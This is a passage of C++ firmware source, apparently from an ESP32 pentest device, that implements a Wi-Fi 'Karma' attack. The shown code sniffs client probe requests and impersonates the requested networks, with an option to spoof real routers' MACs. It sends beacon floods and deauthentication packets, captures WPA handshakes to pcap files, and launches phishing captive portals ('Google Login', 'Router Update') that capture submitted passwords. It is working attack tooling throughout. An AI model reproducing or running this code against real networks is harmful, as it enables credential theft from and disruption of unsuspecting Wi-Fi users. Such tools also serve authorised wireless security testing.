    copyStr(probe.ssid, sizeof(probe.ssid), ssid);
    probe.rssi      = pkt->rx_ctrl.rssi;
    probe.timestamp = millis();
    probe.channel   = pkt->rx_ctrl.channel;
    probe.fingerprint = fp;
    probe.frame     = nullptr;
    probe.frame_len = 0;
    K().probeBufferIndex = (K().probeBufferIndex+1) % MAX_PROBE_BUFFER;
    if(K().probeBufferIndex==0) K().bufferWrapped=true;

    // Queue for main loop processing
    if(K().karmaQueue) {
        QueuedProbeEvent ev={};
        copyStr(ev.mac,  sizeof(ev.mac),  mac);
        copyStr(ev.ssid, sizeof(ev.ssid), ssid);
        ev.rssi      = pkt->rx_ctrl.rssi;
        ev.timestamp = millis();
        ev.channel   = pkt->rx_ctrl.channel;
        ev.fingerprint = fp;
        xQueueSend(K().karmaQueue, &ev, 0);
    }
}

// ============================================================================
// Portal helpers
// ============================================================================
static void destroyPortal() {
    if(!K().activePortal) return;
    if(K().activePortal->instance) { delete K().activePortal->instance; K().activePortal->instance=nullptr; }
    delete K().activePortal; K().activePortal=nullptr;
    K().isPortalActive=false; K().restartAfterPortal=true;
}

static void checkPortal() {
    if(K().karmaPaused || !K().activePortal) return;
    unsigned long now=millis();
    if(now-K().lastPortalHeartbeat < PORTAL_HEARTBEAT_MS) return;
    K().lastPortalHeartbeat=now;

    if(!K().activePortal->instance) { destroyPortal(); return; }

    K().activePortal->instance->processRequests();
    K().connectedClients = WiFi.softAPgetStationNum();

    if(K().activePortal->instance->hasCredentials()) {
        K().portalSubmits++;
        K().activePortal->capturedPassword = K().activePortal->instance->getCapturedPassword();
        destroyPortal();
        return;
    }

    unsigned long age = now - K().activePortal->launchTime;
    bool engaged = K().activePortal->instance->hasRecentPageView();
    if(engaged && age > 180000)  { destroyPortal(); return; }
    if(!engaged && age > 30000) { destroyPortal(); return; }
}

static void launchPortal(const String &ssid, uint8_t channel) {
    if(K().activePortal || !K().templateSelected) return;
    if(ssid.isEmpty() || ssid=="*WILDCARD*") return;

    BackgroundPortal *p = new (std::nothrow) BackgroundPortal();
    if(!p) return;
    p->ssid       = ssid;
    p->channel    = channel;
    p->launchTime = millis();
    p->lastHeartbeat = millis();
    p->hasCreds   = false;
    p->instance   = new (std::nothrow) EvilPortal(ssid, channel, false, false, true, true,
                                                   K().selectedTemplate.filename);
    if(!p->instance) { delete p; return; }
    p->instance->setBaseDuration(15);
    p->instance->setExtendedDuration(180);
    K().activePortal   = p;
    K().isPortalActive = true;
    Serial.printf("[KARMA] Portal launched for '%s' ch%d\n", ssid.c_str(), channel);
}

// ============================================================================
// Portal template loading
// ============================================================================
static String getDisplayName(const String &path, bool isSD) {
    String name = path.substring(path.lastIndexOf('/')+1);
    name.replace(".html","");
    return (isSD?"[SD] ":"[FS] ") + name;
}

static void loadPortalTemplates() {
    K().portalTemplates.clear();
    K().portalTemplates.push_back({"Google Login","",true,false});
    K().portalTemplates.push_back({"Router Update","",true,true});
    FS *fs=nullptr;
    if(getFsStorage(fs)&&fs==&SD && SD.exists("/PortalTemplates")) {
        File root=SD.open("/PortalTemplates"); File f=root.openNextFile();
        while(f && K().portalTemplates.size()<MAX_PORTAL_TEMPLATES) {
            if(!f.isDirectory() && String(f.name()).endsWith(".html")) {
                PortalTemplate t;
                t.name=getDisplayName("/"+String(f.name()),true);
                t.filename="/PortalTemplates/"+String(f.name());
                t.isDefault=false; t.verifyPassword=false;
                K().portalTemplates.push_back(t);
            }
            f=root.openNextFile();
        }
    }
}

static bool selectPortalTemplate() {
    loadPortalTemplates();
    if(K().portalTemplates.empty()) { displayTextLine("No templates found"); delay(1500); return false; }
    drawMainBorderWithTitle("PICK PORTAL PAGE");
    std::vector<Option> opts;
    for(auto &t : K().portalTemplates) {
        opts.push_back({t.name.c_str(), [&](){
            K().selectedTemplate=t; K().templateSelected=true;
        }});
    }
    opts.push_back({"No portal (scan only)",[&](){ K().templateSelected=false; }});
    loopOptions(opts);
    return K().templateSelected;
}

// ============================================================================
// Scan for real AP BSSIDs (for MAC_NETWORK mode and better deauth)
// ============================================================================
static void scanForRealAPs() {
    drawMainBorderWithTitle("SCANNING...");
    displayTextLine("Finding real APs...");
    esp_wifi_set_promiscuous(false);
    delay(100);
    WiFi.mode(WIFI_MODE_STA);
    delay(100);
    int n = WiFi.scanNetworks(false, false);
    for(int i=0; i<n; i++) {
        String ssid = WiFi.SSID(i);
        if(ssid.isEmpty()) continue;
        std::array<uint8_t,6> bssid;
        memcpy(bssid.data(), WiFi.BSSID((uint8_t)i), 6);
        K().networkBSSIDs[ssid] = bssid;
        K().ssidChannel[ssid] = WiFi.channel((uint8_t)i);
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_MODE_AP);
    delay(100);
    // Re-enable promiscuous
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    Serial.printf("[KARMA] Scanned %d real APs\n", n);
}

// ============================================================================
// File save helpers (unchanged)
// ============================================================================
void saveHandshakeToFile(const HandshakeCapture &hs) {
    FS *fs=nullptr; if(!getFsStorage(fs)) return;
    if(!fs->exists("/BrucePCAP/handshakes")) fs->mkdir("/BrucePCAP/handshakes");
    char ms[18];
    snprintf(ms,sizeof(ms),"%02X%02X%02X%02X%02X%02X",hs.bssid[0],hs.bssid[1],hs.bssid[2],hs.bssid[3],hs.bssid[4],hs.bssid[5]);
    String fn="/BrucePCAP/handshakes/HS_"+String(ms)+"_"+hs.ssid+".pcap";
    fn.replace(" ","_"); fn.replace("*","");
    File f=fs->open(fn,FILE_APPEND);
    if(f){
        uint32_t ts=hs.timestamp/1000, tu=(hs.timestamp%1000)*1000, l=hs.frameLen;
        f.write((uint8_t*)&ts,4); f.write((uint8_t*)&tu,4); f.write((uint8_t*)&l,4); f.write((uint8_t*)&l,4);
        f.write(hs.eapolFrame,hs.frameLen); f.close();
    }
}

void saveProbesToFile(FS &fs, bool compressed) {
    if(!K().storageAvailable) return;
    if(!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    File f=fs.open(K().filen, FILE_WRITE);
    if(!f) return;
    f.println("Timestamp,MAC,RSSI,Channel,SSID");
    int count=K().bufferWrapped?MAX_PROBE_BUFFER:K().probeBufferIndex;
    count=min(count,100);
    for(int i=0;i<count;i++){
        int idx=K().bufferWrapped?(K().probeBufferIndex+i)%MAX_PROBE_BUFFER:i;
        const auto &p=K().probeBuffer[idx];
        if(!probeEmpty(p)&&!probeWild(p))
            f.printf("%lu,%s,%d,%d,\"%s\"\n",p.timestamp,p.mac,p.rssi,p.channel,p.ssid);
    }
    f.close();
}

// ============================================================================
// UI drawing — clean card-based layout matching deauther.cpp
// ============================================================================
static void drawKarmaScreen() {
    int W = tft.width();
    int H = tft.height();
    tft.fillScreen(bruceConfig.bgColor);

    // ---- Title bar ----
    uint16_t titleBg = K().karmaPaused ? TFT_NAVY :
                       K().isPortalActive ? TFT_MAROON : bruceConfig.priColor;
    tft.fillRect(0, 0, W, 20, titleBg);
    tft.setTextSize(2);
    tft.setTextColor(TFT_WHITE, titleBg);
    String titleStr = "KARMA ATTACK";
    tft.setCursor((W - (int)titleStr.length()*12)/2, 3);
    tft.print(titleStr);
    if(K().karmaPaused) {
        tft.setTextSize(1); tft.setCursor(W-42,6); tft.setTextColor(TFT_YELLOW,titleBg); tft.print("PAUSED");
    }

    int y = 24;
    int pad = 4;
    int boxH = 32;
    // Three stat boxes: PROBES | CONNECTED | SUBMITS
    int boxW = (W - pad*4)/3;
    int b1x=pad, b2x=pad+boxW+pad, b3x=pad+(boxW+pad)*2;

    // Helper: draw stat box
    auto statBox = [&](int x, int yy, int w, int h, const char *label, const String &val, uint16_t col){
        tft.drawRect(x, yy, w, h, TFT_DARKGREY);
        tft.setTextSize(1); tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.setCursor(x+3, yy+3); tft.print(label);
        tft.setTextSize(2); tft.setTextColor(col, bruceConfig.bgColor);
        int vw=(int)val.length()*12; int vx=x+(w-vw)/2; if(vx<x+2)vx=x+2;
        tft.setCursor(vx, yy+13); tft.print(val);
    };

    statBox(b1x, y, boxW, boxH, "PROBES",    String(K().totalProbes),     TFT_CYAN);
    statBox(b2x, y, boxW, boxH, "CONNECTED", String(K().connectedClients), TFT_GREEN);
    statBox(b3x, y, boxW, boxH, "SUBMITS",   String(K().portalSubmits),   TFT_YELLOW);
    y += boxH + 4;

    // ---- Current target info ----
    tft.drawFastHLine(0, y, W, TFT_DARKGREY); y+=3;
    tft.setTextSize(1);
    int lh=10, maxC=(W-8)/6;

    auto printLine = [&](const String &label, const String &val, uint16_t col){
        if(y+lh > H-18) return;
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor); tft.setCursor(4,y); tft.print(label);
        tft.setTextColor(col, bruceConfig.bgColor);
        String v=val; int avail=maxC-(int)label.length(); if(avail<4)avail=4;
        if((int)v.length()>avail) v=v.substring(0,avail-1)+"~";
        tft.print(v); y+=lh;
    };

    String targetLabel = K().autoMode ? "AUTO: " : "TARGET: ";
    String targetVal   = K().currentAPSSID.isEmpty() ? "(waiting...)" : K().currentAPSSID;
    printLine(targetLabel, targetVal, TFT_CYAN);

    String modeStr = K().autoMode ? "Auto (cycles top probes)" : "Locked";
    printLine("Mode:    ", modeStr, TFT_WHITE);

    String macModeStr = (K().macMode==MAC_NETWORK) ? "Network MAC" : "Random MAC";
    printLine("MAC:     ", macModeStr, TFT_WHITE);

    String chStr = String(pgm_read_byte(&karma_channels[K().channl%14]));
    printLine("Channel: ", chStr, TFT_WHITE);

    if(K().isPortalActive && K().activePortal) {
        unsigned long age=(millis()-K().activePortal->launchTime)/1000;
        printLine("Portal:  ", K().activePortal->ssid+" ("+String(age)+"s)", TFT_RED);
    } else if(K().templateSelected) {
        printLine("Portal:  ", K().selectedTemplate.name, TFT_DARKGREY);
    }

    if(K().broadcastAttack.isActive()) {
        printLine("Scan DB: ", K().broadcastAttack.getProgressString(), TFT_MAGENTA);
    }

    // ---- Top probes list ----
    if(!K().sortedProbes.empty() && y+lh*2 < H-18) {
        tft.drawFastHLine(0, y, W, TFT_DARKGREY); y+=3;
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.setCursor(4,y); tft.print("TOP PROBES:"); y+=lh;
        int shown=0;
        for(auto &p : K().sortedProbes) {
            if(shown>=3 || y+lh>H-18) break;
            String chI=""; auto ci=K().ssidChannel.find(p.first); if(ci!=K().ssidChannel.end()) chI="ch"+String(ci->second);
            String rsI=""; auto ri=K().ssidRSSI.find(p.first); if(ri!=K().ssidRSSI.end()) rsI=String(ri->second)+"dB";
            String line=p.first+" ("+String(p.second)+" "+chI+" "+rsI+")";
            tft.setTextColor(TFT_WHITE,bruceConfig.bgColor);
            tft.setCursor(4,y);
            if((int)line.length()>maxC) line=line.substring(0,maxC-1)+"~";
            tft.print(line); y+=lh; shown++;
        }
    }

    // ---- Footer ----
    int fy=H-14;
    tft.drawFastHLine(0,fy-1,W,TFT_DARKGREY);
    tft.setTextSize(1); tft.setTextColor(TFT_DARKGREY,bruceConfig.bgColor);
    tft.setCursor(2,fy+2);
    tft.print("[OK]Menu [");
    tft.setTextColor(TFT_CYAN,bruceConfig.bgColor); tft.print("^v");
    tft.setTextColor(TFT_DARKGREY,bruceConfig.bgColor); tft.print("]Ch [ESC]Exit");
}

// ============================================================================
// Target selection menu — sorted by probe count
// ============================================================================
static void showTargetMenu() {
    if(K().sortedProbes.empty()) { displayTextLine("No probes captured yet"); delay(1500); return; }

    drawMainBorderWithTitle("PICK TARGET NETWORK");
    std::vector<Option> opts;

    // Auto option first
    opts.push_back({"[Auto] Cycle top probed networks", [&](){
        K().autoMode=true; K().lockedSSID="";
        K().autoIndex=0; K().autoSSIDTime=0; // force immediate switch
        displayTextLine("Auto mode enabled"); delay(1000);
    }});

    // Then sorted probes
    for(auto &p : K().sortedProbes) {
        String ssid = p.first;
        uint32_t cnt = p.second;
        uint8_t ch = 1; auto ci=K().ssidChannel.find(ssid); if(ci!=K().ssidChannel.end()) ch=ci->second;
        int8_t rssi=-100; auto ri=K().ssidRSSI.find(ssid); if(ri!=K().ssidRSSI.end()) rssi=ri->second;
        String label = ssid + "  (" + String(cnt) + " probes, ch" + String(ch) + ", " + String(rssi) + "dBm)";
        opts.push_back({label.c_str(), [=](){
            K().autoMode=false; K().lockedSSID=ssid; K().lockedChannel=ch;
            switchAPToSSID(ssid, ch);
            sendBeaconBurst(ssid, ch);
            displayTextLine("Locked: "+ssid); delay(1000);
        }});
    }
    opts.push_back({"Back", [](){}});
    loopOptions(opts);
}

// ============================================================================
// MAC address menu
// ============================================================================
static void showMACMenu() {
    drawMainBorderWithTitle("MAC ADDRESS MODE");
    std::vector<Option> opts;

    opts.push_back({"Network MAC (spoof target's real router)", [&](){
        K().macMode = MAC_NETWORK;
        // Trigger a scan to populate real BSSIDs
        scanForRealAPs();
        displayTextLine("Using network MACs"); delay(1000);
    }});

    opts.push_back({"Random MAC", [&](){
        K().macMode = MAC_RANDOM;
        drawMainBorderWithTitle("CHANGE INTERVAL");
        std::vector<Option> iOpts;
        for(int i=0;i<NUM_MAC_INTERVALS;i++) {
            uint32_t ms = MAC_INTERVALS[i];
            String lbl = String(MAC_INTERVAL_NAMES[i]);
            iOpts.push_back({lbl.c_str(), [=](){ K().macRotateIntervalMs=ms; displayTextLine("Interval: "+String(MAC_INTERVAL_NAMES[i])); delay(1000); }});
        }
        iOpts.push_back({"Back",[](){}});
        loopOptions(iOpts);
    }});

    opts.push_back({"Rotate Now (random immediately)", [&](){
        generateRandomBSSID(K().currentBSSID); K().lastMACRotation=millis();
        displayTextLine("MAC rotated now"); delay(1000);
    }});

    opts.push_back({"Back",[](){}});
    loopOptions(opts);
}

// ============================================================================
// Scan AP BSSIDs for Network MAC mode (standalone menu entry)
// ============================================================================
static void showStatsScreen() {
    drawMainBorderWithTitle("KARMA STATS");
    int y=30; tft.setTextSize(1); tft.setTextColor(bruceConfig.priColor,bruceConfig.bgColor);
    auto ln=[&](const String &s){ tft.setCursor(6,y); tft.print(s); y+=11; };
    ln("Probes captured: "+String(K().totalProbes));
    ln("Unique networks: "+String(K().uniqueSSIDs));
    ln("Connected now:   "+String(K().connectedClients));
    ln("Portal submits:  "+String(K().portalSubmits));
    ln("Karma responses: "+String(K().karmaResponsesSent));
    ln("Beacons sent:    "+String(K().beaconsSent));
    ln("Deauth pkts:     "+String(K().deauthPacketsSent));
    ln("Handshakes:      "+String(K().handshakeBuffer.size()));
    ln("Current SSID:    "+K().currentAPSSID);
    ln("Mode: "+(K().autoMode?String("Auto"):String("Locked: ")+K().lockedSSID));
    tft.setCursor(6,tft.height()-14);
    tft.setTextColor(TFT_DARKGREY,bruceConfig.bgColor);
    tft.print("Press any key...");
    while(!check(AnyKeyPress)) delay(50);
}

// ============================================================================
// Main menu (ESC/OK press)
// ============================================================================
static bool showKarmaMenu(bool &exitFlag, FS *saveFs) {
    std::vector<Option> opts;

    // Pause/resume
    opts.push_back({K().karmaPaused ? "Resume scanning" : "Pause scanning", [&](){
        K().karmaPaused = !K().karmaPaused;
        if(K().karmaPaused) { esp_wifi_set_promiscuous(false); displayTextLine("Paused"); }
        else { esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(probe_sniffer); displayTextLine("Resumed"); }
        delay(800);
    }});

    // Target picker
    opts.push_back({"Pick target network", [&](){ showTargetMenu(); }});

    // MAC address mode
    opts.push_back({"MAC address settings", [&](){ showMACMenu(); }});

    // Channel control
    opts.push_back({"Channel settings", [&](){
        std::vector<Option> co;
        co.push_back({K().auto_hopping?"Auto hop: ON (tap to disable)":"Auto hop: OFF (tap to enable)",[&](){
            K().auto_hopping=!K().auto_hopping;
            displayTextLine(K().auto_hopping?"Auto hop ON":"Auto hop OFF"); delay(800);
        }});
        co.push_back({"Hop speed: Fast (500ms)",[&](){ K().hop_interval=500; displayTextLine("Fast hop"); delay(800); }});
        co.push_back({"Hop speed: Normal (2s)", [&](){ K().hop_interval=2000;displayTextLine("Normal hop");delay(800); }});
        co.push_back({"Hop speed: Slow (5s)",   [&](){ K().hop_interval=5000;displayTextLine("Slow hop"); delay(800); }});
        co.push_back({"Back",[](){}});
        loopOptions(co);
    }});

    // Deauth toggle
    opts.push_back({K().enableDeauth?"Deauth: ON  (tap to disable)":"Deauth: OFF (tap to enable)",[&](){
        K().enableDeauth=!K().enableDeauth;
        displayTextLine(K().enableDeauth?"Deauth enabled":"Deauth disabled"); delay(800);
    }});

    // Deauth note — tell user why it wasn't working
    if(K().enableDeauth && K().networkBSSIDs.empty()) {
        opts.push_back({"Scan real APs first (for deauth to work)", [&](){
            scanForRealAPs();
            displayTextLine("APs scanned: "+String(K().networkBSSIDs.size())); delay(1000);
        }});
    }

    // Beacon spam toggle
    opts.push_back({K().enableBeaconing?"Beacons: ON (tap to disable)":"Beacons: OFF (tap to enable)",[&](){
        K().enableBeaconing=!K().enableBeaconing;
        displayTextLine(K().enableBeaconing?"Beacons ON":"Beacons OFF"); delay(800);
    }});

    // Portal settings
    opts.push_back({"Change portal page", [&](){ selectPortalTemplate(); }});

    // SSID wordlist broadcast
    opts.push_back({K().broadcastAttack.isActive()?"Stop wordlist scan":"Start wordlist scan (popular SSIDs)",[&](){
        if(K().broadcastAttack.isActive()) { K().broadcastAttack.stop(); displayTextLine("Wordlist stopped"); }
        else { K().broadcastAttack.start(); displayTextLine("Wordlist started: "+String(SSIDDatabase::getCount())+" SSIDs"); }
        delay(800);
    }});

    // Scan real APs
    opts.push_back({"Scan real APs (for Network MAC / deauth)", [&](){
        scanForRealAPs();
        displayTextLine("Found: "+String(K().networkBSSIDs.size())+" real APs"); delay(1200);
    }});

    // Handshake capture
    opts.push_back({K().handshakeCaptureEnabled?"Handshake capture: ON":"Handshake capture: OFF",[&](){
        K().handshakeCaptureEnabled=!K().handshakeCaptureEnabled;
        displayTextLine(K().handshakeCaptureEnabled?"HS capture ON":"HS capture OFF"); delay(800);
    }});

    // View captured credentials
    opts.push_back({"View saved credentials",[&](){
        FS *fs=nullptr;
        if(getFsStorage(fs)&&fs->exists("/PortalCreds")) { loopSD(*fs,false,"TXT","/PortalCreds"); }
        else { displayTextLine("No credentials yet"); delay(1000); }
    }});

    // Stats
    opts.push_back({"Show stats", [&](){ showStatsScreen(); }});

    // Save probes
    opts.push_back({"Save probe log",[&](){
        if(saveFs&&K().storageAvailable) { saveProbesToFile(*saveFs,false); displayTextLine("Saved!"); }
        else displayTextLine("No storage");
        delay(1000);
    }});

    // Exit
    opts.push_back({"Exit Karma", [&](){ exitFlag=true; }});

    loopOptions(opts);
    return exitFlag;
}

// ============================================================================
// karma_setup() — main entry point
// ============================================================================
void karma_setup() {
    if(!ensureKarmaState()) { displayError("Memory error",true); return; }

    cleanlyStopWebUiForWiFiFeature();
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    delay(100);

    // Init state
    K().totalProbes=0; K().uniqueSSIDs=0; K().connectedClients=0; K().portalSubmits=0;
    K().probeBufferIndex=0; K().bufferWrapped=false; K().karmaPaused=false;
    K().ssidFrequency.clear(); K().ssidChannel.clear(); K().ssidRSSI.clear();
    K().sortedProbes.clear(); K().networkBSSIDs.clear(); K().seenMACs.clear();
    K().autoMode=true; K().lockedSSID=""; K().autoIndex=0; K().autoSSIDTime=0;
    K().currentAPSSID=""; K().channl=0;
    K().enableBeaconing=true; K().enableAutoKarma=true; K().enableDeauth=false;
    K().macMode=MAC_RANDOM; K().macRotateIntervalMs=60000;
    K().karmaResponsesSent=0; K().beaconsSent=0; K().deauthPacketsSent=0;
    K().pmkidCaptured=0; K().handshakeBuffer.clear();
    for(auto &p : K().probeBuffer) { if(p.frame){free(p.frame);p.frame=nullptr;} p.mac[0]='\0'; p.ssid[0]='\0'; }
    destroyPortal();

    generateRandomBSSID(K().currentBSSID);
    K().lastMACRotation=millis();

    // Start WiFi as AP+STA so we can both advertise and scan
    WiFi.mode(WIFI_MODE_APSTA);
    delay(100);
    // Start a dummy AP first (will be replaced when first probe arrives)
    WiFi.softAP("BruceKarma","",1,0,4,false);
    K().currentAPSSID="BruceKarma"; K().currentAPChannel=1;

    // Setup storage
    drawMainBorderWithTitle("KARMA SETUP");
    displayTextLine("Starting...");
    delay(300);

    FS *Fs=nullptr; String FileSys="LittleFS";
    if(getFsStorage(Fs)) {
        FileSys = (Fs==&SD)?"SD":"LittleFS"; K().is_LittleFS=(Fs==&LittleFS);
        K().filen = "/ProbeData/karma_"+String(millis())+".csv";
        K().storageAvailable=true;
    } else { Fs=&LittleFS; K().storageAvailable=checkLittleFsSizeNM(); }
    if(K().storageAvailable&&!Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");
    if(!Fs->exists("/PortalCreds")) Fs->mkdir("/PortalCreds");

    // Select portal template
    displayTextLine("Select portal page...");
    delay(300);
    selectPortalTemplate();

    // Init MAC cache + queue
    initMACCache();
    if(K().karmaQueue) { vQueueDelete(K().karmaQueue); K().karmaQueue=nullptr; }
    K().karmaQueue = xQueueCreate(KARMA_QUEUE_DEPTH, sizeof(QueuedProbeEvent));

    // Start promiscuous sniffing
    ensureWifiPlatform();
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    esp_wifi_set_channel(pgm_read_byte(&karma_channels[0]), WIFI_SECOND_CHAN_NONE);

    returnToMenu=false;
    bool exitFlag=false;

    // Draw initial screen
    drawKarmaScreen();
    unsigned long lastDraw=0;

    for(;;) {

        // Restart after portal
        if(K().restartAfterPortal) {
            K().restartAfterPortal=false;
            K().connectedClients=0;
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
            K().auto_hopping=true;
        }

        if(returnToMenu || exitFlag) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            destroyPortal();
            if(K().macRingBuffer){vRingbufferDelete(K().macRingBuffer);K().macRingBuffer=nullptr;}
            if(K().karmaQueue){vQueueDelete(K().karmaQueue);K().karmaQueue=nullptr;}
            delay(50);
            releaseKarmaState();
            return;
        }

        // Process queued probe events
        if(K().karmaQueue && !K().karmaPaused) {
            QueuedProbeEvent ev={};
            while(xQueueReceive(K().karmaQueue, &ev, 0)==pdTRUE) {
                String ssid=ev.ssid, mac=ev.mac;
                handleProbe(ssid, mac, ev.channel, ev.rssi);
            }
        }

        // Auto-hop channel
        if(!K().karmaPaused && K().auto_hopping && !K().isPortalActive) smartChannelHop();

        // Update auto SSID cycling
        if(!K().karmaPaused && K().autoMode) updateAutoTarget();

        // Continuous beacons for current AP SSID
        if(!K().karmaPaused && K().enableBeaconing && !K().currentAPSSID.isEmpty()
           && K().currentAPSSID != "BruceKarma") {
            static unsigned long lastBeacon=0;
            if(millis()-lastBeacon>102) { // ~102ms = 100 TU beacon interval
                uint8_t buf[128];
                size_t len=buildBeacon(buf, K().currentAPSSID, K().currentAPChannel);
                sendRawOnAP(buf, len, K().currentAPChannel);
                K().beaconsSent++;
                lastBeacon=millis();
            }
        }

        // MAC rotation check
        if(!K().karmaPaused) checkMACRotation();

        // Update connected count
        K().connectedClients = WiFi.softAPgetStationNum();

        // Portal heartbeat
        if(!K().karmaPaused) checkPortal();

        // Launch portal for connected client
        if(!K().karmaPaused && K().connectedClients>0 && !K().isPortalActive
           && K().templateSelected && !K().currentAPSSID.isEmpty()
           && K().currentAPSSID != "BruceKarma") {
            launchPortal(K().currentAPSSID, K().currentAPChannel);
        }

        // Rebuild sorted probes every second
        if(millis()-K().lastSortedProbesUpdate > 1000) rebuildSortedProbes();

        // Redraw screen every second
        if(millis()-lastDraw > 1000) { drawKarmaScreen(); lastDraw=millis(); }

        // Channel up/down
        if(check(NextPress)&&!K().karmaPaused) {
            K().channl=(K().channl+1)%14; K().auto_hopping=false;
            esp_wifi_set_channel(pgm_read_byte(&karma_channels[K().channl]), WIFI_SECOND_CHAN_NONE);
            drawKarmaScreen(); lastDraw=millis();
        }
        if(check(PrevPress)&&!K().karmaPaused) {
            K().channl=(K().channl+13)%14; K().auto_hopping=false;
            esp_wifi_set_channel(pgm_read_byte(&karma_channels[K().channl]), WIFI_SECOND_CHAN_NONE);
            drawKarmaScreen(); lastDraw=millis();
        }

        // OK or ESC → menu
        if(check(SelPress)||check(EscPress)) {
            check(SelPress); check(EscPress);
            esp_wifi_set_promiscuous(false);
            delay(200);
            showKarmaMenu(exitFlag, Fs);
            if(!exitFlag) {
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
                drawKarmaScreen(); lastDraw=millis();
            }
        }

        vTaskDelay(10/portTICK_PERIOD_MS);
    }
}
#endif
